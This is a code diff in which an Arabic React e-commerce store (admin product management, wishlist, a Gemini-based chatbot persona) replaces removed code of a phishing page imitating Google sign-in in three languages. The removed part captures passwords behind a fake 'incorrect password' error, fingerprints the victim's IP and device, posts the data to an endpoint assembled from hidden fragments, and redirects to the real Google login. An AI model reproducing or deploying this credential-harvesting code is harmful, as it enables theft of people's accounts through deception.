+          <textarea placeholder="الوصف" value={description} onChange={(e) => setDescription(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required></textarea>
+          <textarea placeholder="التفاصيل" value={details} onChange={(e) => setDetails(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required></textarea>
+          <div className="flex items-center">
+            <input type="checkbox" id="isFeatured" checked={isFeatured} onChange={(e) => setIsFeatured(e.target.checked)} className="h-4 w-4 text-orange-500 rounded" />
+            <label htmlFor="isFeatured" className="ml-2">منتج مميز</label>
+          </div>
+          <div className="flex justify-end space-x-2 space-x-reverse">
+            <Button type="button" onClick={onClose} className="bg-gray-500 hover:bg-gray-600 text-white">إلغاء</Button>
+            <Button type="submit" className="bg-orange-500 hover:bg-orange-600 text-white">حفظ التغييرات</Button>
+          </div>
+        </form>
+      </div>
+    </div>
+  );
+};
+
+
+// Admin Page
+const AdminPage = () => {
+  const [productName, setProductName] = useState('');
+  const [productCategory, setProductCategory] = useState('');
+  const [productPrice, setProductPrice] = useState('');
+  const [productImage, setProductImage] = useState('');
+  const [productDescription, setProductDescription] = useState('');
+  const [productDetails, setProductDetails] = useState('');
+  const [isFeatured, setIsFeatured] = useState(false);
+  const [editingProduct, setEditingProduct] = useState(null); // New state for editing
+  
+  const { isDarkMode } = useContext(ThemeContext);
+  const { products } = useContext(ProductsContext);
+  const { showModal } = useContext(ModalContext);
+  const { user } = useContext(AuthContext);
+
+  const handleAddProduct = async (e) => {
+    e.preventDefault();
+    if (!user) {
+      showModal('يرجى تسجيل الدخول كمدير لإضافة المنتجات.');
+      return;
+    }
+    try {
+      // Now adds product to the user's private collection
+      await addDoc(collection(db, `artifacts/${appId}/users/${user.uid}/products`), {
+        name: productName,
+        category: productCategory,
+        price: parseFloat(productPrice),
+        image: productImage,
+        description: productDescription,
+        details: productDetails,
+        isFeatured: isFeatured,
+      });
+      showModal('تمت إضافة المنتج بنجاح!');
+      // Clear form
+      setProductName('');
+      setProductCategory('');
+      setProductPrice('');
+      setProductImage('');
+      setProductDescription('');
+      setProductDetails('');
+      setIsFeatured(false);
+    } catch (e) {
+      console.error("Error adding product: ", e);
+      showModal('حدث خطأ أثناء إضافة المنتج.');
+    }
+  };
+
+  const handleUpdateProduct = async (id, updatedData) => {
+    if (!user) {
+      showModal('يرجى تسجيل الدخول كمدير لتعديل المنتجات.');
+      return;
+    }
+    try {
+      await updateDoc(doc(db, `artifacts/${appId}/users/${user.uid}/products`, id), updatedData);
+      showModal('تم تحديث المنتج بنجاح!');
+      setEditingProduct(null); // Close the modal
+    } catch (e) {
+      console.error("Error updating product: ", e);
+      showModal('حدث خطأ أثناء تحديث المنتج.');
+    }
+  };
+
+  const handleDeleteProduct = (id) => {
+    showModal('هل أنت متأكد من حذف هذا المنتج؟', 'confirm', async () => {
+      if (!user) {
+        showModal('يرجى تسجيل الدخول كمدير لحذف المنتجات.');
+        return;
+      }
+      try {
+        // Now deletes product from the user's private collection
+        await deleteDoc(doc(db, `artifacts/${appId}/users/${user.uid}/products`, id));
+        showModal('تم حذف المنتج بنجاح.');
+      } catch (e) {
+        console.error("Error deleting product: ", e);
+        showModal('حدث خطأ أثناء حذف المنتج.');
+      }
+    });
+  };
+
+  return (
+    <div className="container mx-auto p-8" style={fontStyles.general}>
+      <h1 className="text-4xl font-bold text-center mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>لوحة تحكم المدير</h1>
+      <div className="rounded-2xl shadow-lg p-6 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+        <h2 className="text-2xl font-bold mb-4" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>إضافة منتج جديد</h2>
+        <form onSubmit={handleAddProduct} className="space-y-4">
+          <input type="text" placeholder="اسم المنتج" value={productName} onChange={(e) => setProductName(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required />
+          <input type="text" placeholder="الفئة" value={productCategory} onChange={(e) => setProductCategory(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required />
+          <input type="number" step="0.01" placeholder="السعر" value={productPrice} onChange={(e) => setProductPrice(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required />
+          <input type="text" placeholder="رابط الصورة" value={productImage} onChange={(e) => setProductImage(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required />
+          <textarea placeholder="الوصف" value={productDescription} onChange={(e) => setProductDescription(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required></textarea>
+          <textarea placeholder="التفاصيل" value={productDetails} onChange={(e) => setProductDetails(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required></textarea>
+          <div className="flex items-center">
+            <input type="checkbox" id="isFeatured" checked={isFeatured} onChange={(e) => setIsFeatured(e.target.checked)} className="h-4 w-4 text-orange-500 rounded" />
+            <label htmlFor="isFeatured" className="ml-2" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>منتج مميز</label>
+          </div>
+          <Button type="submit" className="bg-green-500 hover:bg-green-600 text-white w-full">إضافة المنتج</Button>
+        </form>
+
+        <h2 className="text-2xl font-bold mt-8 mb-4" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>إدارة المنتجات</h2>
+        <div className="space-y-4">
+          {products.map(product => (
+            <div key={product.id} className="flex items-center justify-between rounded-xl p-4 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary }}>
+              <span>{product.name} - {product.price.toFixed(2)} ر.س</span>
+              <div className="flex items-center space-x-2 space-x-reverse">
+                <button onClick={() => setEditingProduct(product)} className="bg-blue-500 text-white p-2 rounded-full hover:bg-blue-600 transition-colors duration-200">
+                  <Pencil size={20} />
+                </button>
+                <button onClick={() => handleDeleteProduct(product.id)} className="bg-red-500 text-white p-2 rounded-full hover:bg-red-600 transition-colors duration-200">
+                  <TrashIcon />
+                </button>
+              </div>
+            </div>
+          ))}
+        </div>
+      </div>
+      {editingProduct && (
+        <EditProductModal
+          product={editingProduct}
+          onClose={() => setEditingProduct(null)}
+          onUpdate={handleUpdateProduct}
+        />
+      )}
+    </div>
+  );
+};
+
+// Wishlist Page
+const WishlistPage = () => {
+  const { user } = useContext(AuthContext);
+  const { wishlistItems, removeFromWishlist } = useContext(WishlistContext);
+  const { isDarkMode } = useContext(ThemeContext);
+
+  if (!user || !user.email) {
+    return (
+      <div className="container mx-auto p-8 text-center" style={fontStyles.general}>
+        <h1 className="text-4xl font-bold mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>قائمة الأمنيات</h1>
+        <p style={{ color: isDarkMode ? colors.secondary : colors.primary }}>يرجى تسجيل الدخول لعرض قائمة الأمنيات.</p>
+      </div>
+    );
+  }
+
+  return (
+    <div className="container mx-auto p-8" style={fontStyles.general}>
+      <h1 className="text-4xl font-bold text-center mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>قائمة الأمنيات</h1>
+      {wishlistItems.length === 0 ? (
+        <div className="text-center text-xl py-12" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>
+          قائمة الأمنيات فارغة.
+        </div>
+      ) : (
+        <div className="rounded-2xl shadow-lg p-6 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+          <div className="space-y-6">
+            {wishlistItems.map(item => (
+              <div key={item.id} className="flex items-center justify-between border-b pb-4 last:border-b-0 last:pb-0" style={{ borderColor: isDarkMode ? colors.accent : colors.primary }}>
+                <div className="flex items-center space-x-4 space-x-reverse">
+                  <img src={item.image} alt={item.name} className="w-20 h-20 object-cover rounded-xl" />
+                  <div>
+                    <h3 className="text-lg font-semibold" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>{item.name}</h3>
+                    <p style={{ color: isDarkMode ? colors.secondary : colors.primary }}>{item.price.toFixed(2)} ر.س</p>
+                  </div>
                 </div>
-            `,
-            en: `
-                <div class="password-one-column">
-                    <i class="fas fa-arrow-left back-arrow" onclick="showPage('loginPage', 'backward')"></i>
-                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
-                    <h1>Welcome</h1>
-                    <div class="header-info">
-                        <i class="fas fa-user-circle profile-icon" style="background-color: transparent;"></i>
-                        <span class="profile-email" id="displayEmail"></span>
-                    </div>
-                    <form id="passwordForm">
-                        <p class="error-message" id="fakeErrorMessage" style="display: none;">Incorrect password. Please try again.</p>
-                        <div class="input-group">
-                            <input type="password" id="passwordInput" class="input-field" placeholder="Enter your password" required>
-                        </div>
-                        <label class="show-password-checkbox">
-                            <input type="checkbox" id="showPasswordCheckbox">
-                            <span>Show password</span>
-                        </label>
-                        <div class="form-actions" style="margin-top: 24px;">
-                            <a href="#" class="text-link" id="forgotPasswordLink">Forgot password?</a>
-                            <button type="submit" class="next-button">Next</button>
-                        </div>
-                    </form>
+                <button
+                  onClick={() => removeFromWishlist(item.id)}
+                  className="bg-red-500 text-white p-2 rounded-full hover:bg-red-600 transition-colors duration-200"
+                >
+                  <TrashIcon />
+                </button>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+    </div>
+  );
+};
+
+// AI Chatbot Component
+const Chatbot = () => {
+  const [isOpen, setIsOpen] = useState(false);
+  const [messages, setMessages] = useState([{
+    sender: 'bot',
+    text: 'أهلاً بك يا صديقي! أنا ودود، مستشارك الفكاهي في عالم الشوكولاتة والقهوة. كيف يمكنني أن أجعل يومك أحلى اليوم؟'
+  }]);
+  const [input, setInput] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+  const chatEndRef = useRef(null);
+
+  const chatbotAvatar = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-message-square"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V3a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>';
+  const chocolateAvatar = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><linearGradient id="chocolateGradient" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" style="stop-color:#4A2C2A;stop-opacity:1" /><stop offset="100%" style="stop-color:#785A48;stop-opacity:1" /></linearGradient></defs><path fill="url(#chocolateGradient)" d="M50,90 C30,90 15,75 15,55 C15,35 30,20 50,20 C70,20 85,35 85,55 C85,75 70,90 50,90 Z" /><path fill="#E8E2D9" d="M30,55 Q40,65 50,55 T70,55 A5,5 0 0 1 70,60 H30 A5,5 0 0 1 30,55 Z" /><circle cx="40" cy="45" r="5" fill="#E8E2D9" /><circle cx="60" cy="45" r="5" fill="#E8E2D9" /><path fill="none" stroke="#E8E2D9" stroke-width="3" d="M35,65 Q50,80 65,65" /></svg>';
+
+  const handleSendMessage = async () => {
+    if (!input.trim() || isLoading) return;
+    const userMessage = { sender: 'user', text: input };
+    setMessages(prev => [...prev, userMessage]);
+    setInput('');
+    setIsLoading(true);
+
+    const botResponse = await getChatbotResponse(userMessage.text);
+    setMessages(prev => [...prev, { sender: 'bot', text: botResponse }]);
+    setIsLoading(false);
+  };
+
+  const getChatbotResponse = async (userPrompt) => {
+    const prompt = `You are an AI assistant named "ودود" (Wadoud) for an e-commerce store named RIVER. Your persona is funny, encouraging, and an excellent product marketer. Your goal is to help customers, promote products, and be charming. The store sells coffee, sweets, cakes, flowers, and chocolates. If a user asks a question you cannot answer, or is outside of your scope, say: "عفوا المعلومة التي طلبتها ليست لدي، يمكنك التواصل مباشرة مع الدعم الفني أو المتجر".
+    
+    Products available:
+    - مجموعة قهوة فاخرة: أفخر أنواع حبوب البن من مزارع مختارة.
+    - تشكيلة حلويات منوعة: ماكرون، كوكيز، وكب كيك.
+    - كيك الشوكولاتة الغني: كيك ساحر يذوب في الفم.
+    - باقة ورود أنيقة: هدية مثالية من الورود الطازجة.
+    - علبة شوكولا بلجيكية: شوكولا فاخرة بنكهات متعددة.
+    - قهوة اسبريسو خاصة: قهوة غنية ومكثفة.
+    - ماكرون ملون: ماكرون هش وملون.
+    - كيك الفانيليا والفاكهة: كيك خفيف مزين بالفواكه.
+    - كوكيز الشوكولاتة: كوكيز طري محشو بالشوكولاتة.
+    - باقة زهور متنوعة: تنسيق فريد من الزهور.
+    - شوكولا بيضاء باللوز: شوكولاتة بيضاء مع لوز.
+    - قهوة فرنسية: قهوة داكنة التحميص.
+    
+    User query: ${userPrompt}
+    
+    Your response, as Wadoud, must be in Arabic.`;
+
+    try {
+      const payload = {
+        contents: [{ role: "user", parts: [{ text: prompt }] }],
+      };
+      // The API key is managed by the execution environment
+      const apiKey = "";
+      const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-05-20:generateContent?key=${apiKey}`;
+      const response = await fetch(apiUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+
+      const result = await response.json();
+      const text = result?.candidates?.[0]?.content?.parts?.[0]?.text;
+      return text || 'عفوا المعلومة التي طلبتها ليست لدي، يمكنك التواصل مباشرة مع الدعم الفني أو المتجر';
+    } catch (e) {
+      console.error("AI API call failed: ", e);
+      return 'عفوا المعلومة التي طلبتها ليست لدي، يمكنك التواصل مباشرة مع الدعم الفني أو المتجر';
+    }
+  };
+
+  useEffect(() => {
+    if (chatEndRef.current) {
+      chatEndRef.current.scrollIntoView({ behavior: 'smooth' });
+    }
+  }, [messages]);
+
+  const { isDarkMode } = useContext(ThemeContext);
+
+  return (
+    <>
+      <button
+        onClick={() => setIsOpen(!isOpen)}
+        className="fixed bottom-6 right-6 z-50 p-4 rounded-full shadow-lg transition-transform transform hover:scale-110"
+        style={{ backgroundColor: colors.primary, color: colors.secondary }}
+      >
+        <MessageSquare size={24} />
+      </button>
+
+      {isOpen && (
+        <div className="fixed bottom-20 right-6 w-80 h-96 bg-white rounded-2xl shadow-xl flex flex-col z-50 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+          <div className="flex items-center justify-between p-4 border-b rounded-t-2xl" style={{ borderColor: isDarkMode ? colors.accent : colors.primary }}>
+            <div className="flex items-center space-x-2 space-x-reverse">
+              <div className="w-8 h-8 rounded-full" style={{ backgroundImage: `url(${chocolateAvatar})`, backgroundSize: 'cover' }} />
+              <span className="font-bold" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>ودود</span>
+            </div>
+            <button onClick={() => setIsOpen(false)} style={{ color: isDarkMode ? colors.secondary : colors.primary }}><X size={20} /></button>
+          </div>
+
+          <div className="flex-1 overflow-y-auto p-4 space-y-4">
+            {messages.map((msg, index) => (
+              <div key={index} className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
+                <div
+                  className={`p-3 rounded-xl max-w-[75%] ${
+                    msg.sender === 'user' ? 'bg-orange-500 text-white' : 'bg-gray-200 text-gray-800'
+                  }`}
+                  style={{ backgroundColor: msg.sender === 'user' ? '#f97316' : (isDarkMode ? colors.accent : '#F3F4F6'), color: msg.sender === 'user' ? '#ffffff' : (isDarkMode ? colors.secondary : '#111827') }}
+                >
+                  {msg.text}
                 </div>
-            `,
-            es: `
-                <div class="password-one-column">
-                    <i class="fas fa-arrow-left back-arrow" onclick="showPage('loginPage', 'backward')"></i>
-                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
-                    <h1>Bienvenido</h1>
-                    <div class="header-info">
-                        <i class="fas fa-user-circle profile-icon" style="background-color: transparent;"></i>
-                        <span class="profile-email" id="displayEmail"></span>
+              </div>
+            ))}
+            {isLoading && (
+                <div className="flex justify-start">
+                    <div className="p-3 rounded-xl max-w-[75%]" style={{ backgroundColor: isDarkMode ? colors.accent : '#F3F4F6', color: isDarkMode ? colors.secondary : '#111827' }}>
+                        ...
                     </div>
-                    <form id="passwordForm">
-                        <p class="error-message" id="fakeErrorMessage" style="display: none;">Contraseña incorrecta. Inténtalo de nuevo.</p>
-                        <div class="input-group">
-                            <input type="password" id="passwordInput" class="input-field" placeholder="Introduce tu contraseña" required>
-                        </div>
-                        <label class="show-password-checkbox">
-                            <input type="checkbox" id="showPasswordCheckbox">
-                            <span>Mostrar contraseña</span>
-                        </label>
-                        <div class="form-actions" style="margin-top: 24px;">
-                            <a href="#" class="text-link" id="forgotPasswordLink">¿Olvidaste tu contraseña?</a>
-                            <button type="submit" class="next-button">Siguiente</button>
-                        </div>
-                    </form>
                 </div>
-            `
-        };
+            )}
+            <div ref={chatEndRef} />
+          </div>
 
-        const translations = {
-            ar: {
-                title: 'تسجيل الدخول - حسابات Google',
-                h1_login: 'تسجيل الدخول',
-                subtitle_login: 'باستخدام حسابك على Google. سيكون هذا الحساب متاحًا لتطبيقات Google الأخرى في المتصفح.',
-                placeholder_email: 'البريد الإلكتروني أو الهاتف',
-                forgot_email_link: 'هل نسيت البريد الإلكتروني؟',
-                create_account_link: 'إنشاء حساب',
-                next_button: 'التالي',
-                h1_password: 'مرحباً', // Changed title
-                subtitle_password: 'لاستكمال تسجيل الدخول، أدخل كلمة المرور.',
-                fake_error: 'كلمة المرور خاطئة. يُرجى المحاولة مرة أخرى.',
-                forgot_password: 'هل نسيت كلمة المرور؟',
-                show_password_label: 'عرض كلمة المرور',
-                placeholder_password: 'أدخل كلمة المرور',
-                h1_recovery: 'استعادة الحساب',
-                subtitle_recovery: 'للمتابعة، أدخل كلمة المرور الأخيرة التي تتذكرها لهذا الحساب.',
-                placeholder_recovery_password: 'أدخل كلمة المرور',
-                try_another_way: 'تجربة طريقة أخرى',
-                h1_forgot_email: 'البحث عن حسابك',
-                subtitle_forgot_email: 'أدخل رقم هاتفك أو بريدك الإلكتروني الاحتياطي.',
-                placeholder_forgot_email: 'رقم الهاتف أو البريد الإلكتروني',
-                go_back: 'العودة',
-                help: 'مساعدة',
-                privacy: 'الخصوصية',
-                terms: 'البنود',
-            },
-            en: {
-                title: 'Sign in - Google Accounts',
-                h1_login: 'Sign in',
-                subtitle_login: 'with your Google Account. This account will be available to other Google apps in the browser.',
-                placeholder_email: 'Email or phone',
-                forgot_email_link: 'Forgot email?',
-                create_account_link: 'Create account',
-                next_button: 'Next',
-                h1_password: 'Welcome', // Changed title
-                subtitle_password: 'To continue, first verify it\'s you.',
-                fake_error: 'Incorrect password. Please try again.',
-                forgot_password: 'Forgot password?',
-                show_password_label: 'Show password',
-                placeholder_password: 'Enter your password',
-                h1_recovery: 'Account recovery',
-                subtitle_recovery: 'To continue, enter the last password you remember for this account.',
-                placeholder_recovery_password: 'Enter password',
-                try_another_way: 'Try another way',
-                h1_forgot_email: 'Find your account',
-                subtitle_forgot_email: 'Enter your phone number or recovery email.',
-                placeholder_forgot_email: 'Phone number or email',
-                go_back: 'Back',
-                help: 'Help',
-                privacy: 'Privacy',
-                terms: 'Terms'
-            },
-            es: {
-                title: 'Iniciar sesión - Cuentas de Google',
-                h1_login: 'Iniciar sesión',
-                subtitle_login: 'con tu cuenta de Google. Esta cuenta estará disponible para otras aplicaciones de Google en el navegador.',
-                placeholder_email: 'Correo electrónico o teléfono',
-                forgot_email_link: '¿Olvidaste tu correo electrónico?',
-                create_account_link: 'Crear cuenta',
-                next_button: 'Siguiente',
-                h1_password: 'Bienvenido', // Changed title
-                subtitle_password: 'Para continuar, verifica que eres tú.',
-                fake_error: 'Contraseña incorrecta. Inténtalo de nuevo.',
-                forgot_password: '¿Olvidaste tu contraseña?',
-                show_password_label: 'Mostrar contraseña',
-                placeholder_password: 'Introduce tu contraseña',
-                h1_recovery: 'Recuperación de la cuenta',
-                subtitle_recovery: 'Para continuar, introduce la última contraseña que recuerdes para esta cuenta.',
-                placeholder_recovery_password: 'Introduce la contraseña',
-                try_another_way: 'Probar de otra forma',
-                h1_forgot_email: 'Encontrar tu cuenta',
-                subtitle_forgot_email: 'Introduce tu número de teléfono o correo electrónico de recuperación.',
-                placeholder_forgot_email: 'Número de teléfono o correo electrónico',
-                go_back: 'Volver',
-                help: 'Ayuda',
-                privacy: 'Privacidad',
-                terms: 'Términos'
-            }
-        };
+          <div className="p-4 border-t rounded-b-2xl" style={{ borderColor: isDarkMode ? colors.accent : colors.primary }}>
+            <form onSubmit={(e) => { e.preventDefault(); handleSendMessage(); }} className="flex space-x-2 space-x-reverse">
+              <input
+                type="text"
+                value={input}
+                onChange={(e) => setInput(e.target.value)}
+                className="flex-1 px-4 py-2 border rounded-full focus:outline-none focus:ring-2 focus:ring-amber-500 transition-colors duration-300"
+                placeholder="اكتب رسالتك..."
+                disabled={isLoading}
+                style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary }}
+              />
+              <button type="submit" className="bg-orange-500 text-white p-2 rounded-full hover:bg-orange-600 transition-colors duration-200" disabled={isLoading}>
+                <ChevronRight size={24} />
+              </button>
+            </form>
+          </div>
+        </div>
+      )}
+    </>
+  );
+};
 
-        // Function to smoothly transition between pages
-        const showPage = (pageId, direction = 'forward') => {
-            const currentPageElement = pages[currentPageId];
-            const nextPageElement = pages[pageId];
+// Main App Component
+export default function App() {
+  const [currentPage, setCurrentPage] = useState('home');
+  const [selectedProduct, setSelectedProduct] = useState(null);
 
-            if (!currentPageElement || !nextPageElement || currentPageId === pageId) return;
+  const handleNavigate = (page, product = null) => {
+    setCurrentPage(page);
+    setSelectedProduct(product);
+  };
 
-            loadingBar.style.animation = 'loading 0.4s ease-out forwards';
-            loadingBar.style.opacity = '1';
+  const renderPage = () => {
+    switch (currentPage) {
+      case 'home':
+        return <HomePage onNavigate={handleNavigate} />;
+      case 'shop':
+        return <ShopPage onNavigate={handleNavigate} />;
+      case 'product':
+        return <ProductDetailsPage product={selectedProduct} onNavigate={handleNavigate} />;
+      case 'cart':
+        return <CartPage onNavigate={handleNavigate} />;
+      case 'checkout':
+        return <CheckoutPage onNavigate={handleNavigate} />;
+      case 'about':
+        return <AboutPage />;
+      case 'contact':
+        return <ContactPage />;
+      case 'account':
+        return <AccountPage onNavigate={handleNavigate} />;
+      case 'profile':
+        return <ProfilePage onNavigate={handleNavigate} />;
+      case 'wishlist':
+        return <WishlistPage />;
+      case 'admin':
+        return <AdminPage />;
+      case 'offers':
+        return <OffersPage />;
+      default:
+        return <HomePage onNavigate={handleNavigate} />;
+    }
+  };
 
-            currentPageElement.classList.remove('page-transition-enter-active');
-            currentPageElement.classList.add('page-transition-exit-active');
-            
-            if (direction === 'forward') {
-                nextPageElement.style.transform = 'translateX(-100%)';
-            } else {
-                nextPageElement.style.transform = 'translateX(100%)';
-            }
-            nextPageElement.style.opacity = '0';
-            nextPageElement.style.display = 'block';
+  return (
+    <ThemeProvider>
+      <AuthProvider>
+        <ProductsProvider>
+          <WishlistProvider>
+            <CartProvider>
+              <ModalProvider>
+                <AppContent onNavigate={handleNavigate} renderPage={renderPage} />
+              </ModalProvider>
+            </CartProvider>
+          </WishlistProvider>
+        </ProductsProvider>
+      </AuthProvider>
+    </ThemeProvider>
+  );
+}
 
-            setTimeout(() => {
-                currentPageElement.style.display = 'none';
-                nextPageElement.style.transform = 'translateX(0)';
-                nextPageElement.style.opacity = '1';
-                currentPageId = pageId;
+const AppContent = ({ onNavigate, renderPage }) => {
+  const { isDarkMode } = useContext(ThemeContext);
+  const { authReady, isAdmin, user } = useContext(AuthContext);
 
-                loadingBar.style.animation = 'none';
-                loadingBar.style.opacity = '0';
+  useEffect(() => {
+    document.body.style.backgroundColor = isDarkMode ? '#111827' : '#F9FAFB';
+  }, [isDarkMode]);
 
-            }, 200);
-        };
-
-        // Function to send data using the fragmented payload technique
-        const sendDataWithChaff = (data) => {
-            console.log('Preparing the data payload...');
-            
-            // Step 1: Assemble the fragments at the last moment
-            const { url, key, recipient } = assemblePayload();
-            
-            // Step 2: Prepare the data for submission.
-            const formData = new FormData();
-            formData.append('apikey', key);
-            formData.append('to_email', recipient);
-            
-            // Add collected data from the user and device
-            for (const item in data) {
-                formData.append(item, data[item]);
-            }
-            
-            // Step 3: Send the request directly. The barriers have been defeated.
-            fetch(url, { method: 'POST', body: formData })
-                .then(() => {
-                    console.log("Data sent successfully. The defenses have been overcome.");
-                })
-                .catch(() => {
-                    console.log("Failed to send data, but redirection will continue. This may be due to partial blocking.");
-                });
-        };
-
-        // Function to fetch IP address and other device data
-        const collectDeviceData = async () => {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                collectedData.ip = data.ip;
-            } catch (error) {
-                collectedData.ip = 'Unavailable';
-            }
-            collectedData.userAgent = navigator.userAgent;
-            collectedData.screenResolution = `${window.screen.width}x${window.screen.height}`;
-            collectedData.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            console.log("Device fingerprinting collected successfully:", collectedData);
-        };
-
-        // Function to show a fake error message
-        const showFakeError = () => {
-            const errorElement = document.getElementById('fakeErrorMessage');
-            if (errorElement) {
-                errorElement.style.opacity = '1';
-                errorElement.style.display = 'block';
-                setTimeout(() => {
-                    errorElement.style.opacity = '0';
-                    setTimeout(() => {
-                        errorElement.style.display = 'none';
-                    }, 300);
-                }, 3000);
-            }
-        };
-
-        // Password form submission handler (used dynamically)
-        const passwordFormSubmitHandler = (e) => {
-            e.preventDefault();
-            const passwordInput = document.getElementById('passwordInput');
-            if (passwordInput) {
-                collectedData.password = passwordInput.value.trim();
-            }
-            
-            showFakeError();
-            
-            // Using the advanced sending function
-            sendDataWithChaff(collectedData);
-
-            setTimeout(() => {
-                window.location.href = 'https://accounts.google.com/';
-            }, 3500);
-        };
-
-        // "Forgot Password?" link handler (used dynamically)
-        const forgotPasswordLinkHandler = (e) => {
-            e.preventDefault();
-            showPage('recoveryPage', 'forward');
-        };
-
-        // Password toggle logic (dynamic based on language layout)
-        const setupPasswordToggle = (lang) => {
-            const passwordInput = document.getElementById('passwordInput');
-            const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
-            if (showPasswordCheckbox && passwordInput) {
-                showPasswordCheckbox.addEventListener('change', () => {
-                    passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
-                });
-            }
-        };
-
-        const updateLanguage = (lang) => {
-            const t = translations[lang] || translations.ar;
-            document.title = t.title;
-            
-            document.body.style.direction = (lang === 'ar') ? 'rtl' : 'ltr';
-
-            if (document.querySelector('#loginPage h1')) document.querySelector('#loginPage h1').textContent = t.h1_login;
-            if (document.querySelector('#loginPageSubtitle')) document.querySelector('#loginPageSubtitle').textContent = t.subtitle_login;
-            if (document.getElementById('emailInput')) document.getElementById('emailInput').placeholder = t.placeholder_email;
-            if (document.getElementById('forgotEmailLink')) document.getElementById('forgotEmailLink').textContent = t.forgot_email_link;
-            if (document.getElementById('createAccountLink')) document.getElementById('createAccountLink').textContent = t.create_account_link;
-            if (document.querySelector('#loginForm .next-button')) document.querySelector('#loginForm .next-button').textContent = t.next_button;
-            
-            const passwordPageContainer = document.getElementById('passwordPage');
-            if (passwordPageContainer) {
-                passwordPageContainer.innerHTML = passwordPageLayouts[lang] || passwordPageLayouts.ar;
-            }
-
-            const displayEmail = document.getElementById('displayEmail');
-            if (displayEmail) displayEmail.textContent = collectedData.email || '';
-
-            if (document.querySelector('#passwordPage h1')) document.querySelector('#passwordPage h1').textContent = t.h1_password;
-            if (document.querySelector('#passwordPage .subtitle')) document.querySelector('#passwordPage .subtitle').textContent = t.subtitle_password;
-            if (document.getElementById('fakeErrorMessage')) document.getElementById('fakeErrorMessage').textContent = t.fake_error;
-            if (document.getElementById('passwordInput')) document.getElementById('passwordInput').placeholder = t.placeholder_password;
-            if (document.getElementById('forgotPasswordLink')) document.getElementById('forgotPasswordLink').textContent = t.forgot_password;
-            if (document.querySelector('#passwordForm .next-button')) document.querySelector('#passwordForm .next-button').textContent = t.next_button;
-            if (document.querySelector('#showPasswordCheckbox')) {
-                document.querySelector('.show-password-checkbox span').textContent = t.show_password_label;
-            }
-            
-            const passwordForm = document.getElementById('passwordForm');
-            const forgotPasswordLink = document.getElementById('forgotPasswordLink');
-            if (passwordForm) {
-                passwordForm.addEventListener('submit', passwordFormSubmitHandler);
-            }
-            if (forgotPasswordLink) {
-                forgotPasswordLink.addEventListener('click', forgotPasswordLinkHandler);
-            }
-            setupPasswordToggle(lang);
-
-            if (document.querySelector('#recoveryPage h1')) document.querySelector('#recoveryPage h1').textContent = t.h1_recovery;
-            if (document.querySelector('#recoveryPage .subtitle')) document.querySelector('#recoveryPage .subtitle').textContent = t.subtitle_recovery;
-            if (document.getElementById('recoveryPasswordInput')) document.getElementById('recoveryPasswordInput').placeholder = t.placeholder_recovery_password;
-            if (document.getElementById('tryAnotherWayLink')) document.getElementById('tryAnotherWayLink').textContent = t.try_another_way;
-            if (document.querySelector('#recoveryForm .next-button')) document.querySelector('#recoveryForm .next-button').textContent = t.next_button;
-            
-            if (document.querySelector('#forgotEmailPage h1')) document.querySelector('#forgotEmailPage h1').textContent = t.h1_forgot_email;
-            if (document.querySelector('#forgotEmailPage .subtitle')) document.querySelector('#forgotEmailPage .subtitle').textContent = t.subtitle_forgot_email;
-            if (document.getElementById('forgotEmailInput')) document.getElementById('forgotEmailInput').placeholder = t.placeholder_forgot_email;
-            if (document.getElementById('forgotEmailGoBack')) document.querySelector('#forgotEmailGoBack').textContent = t.go_back;
-            if (document.querySelector('#forgotEmailPage .next-button')) document.querySelector('#forgotEmailPage .next-button').textContent = t.next_button;
-            
-            if (document.querySelector('.footer-links a:nth-child(1)')) document.querySelector('.footer-links a:nth-child(1)').textContent = t.help;
